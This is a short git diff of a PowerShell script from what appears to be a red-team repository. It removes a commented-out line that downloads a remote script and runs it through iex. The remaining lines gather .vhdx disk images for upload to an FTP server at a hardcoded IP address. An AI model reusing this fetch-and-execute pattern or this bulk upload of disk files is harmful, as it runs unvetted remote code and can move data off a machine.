@@ -23,8 +23,6 @@ Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
 Write-Host ""
 Write-Host ""
 
-# iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/transfer.ps1')
-
 $file = Get-ChildItem -Path "C:\eren\" -Filter "*.vhdx" -Recurse
 
 $ftpServer = "ftp://78.129.240.79"
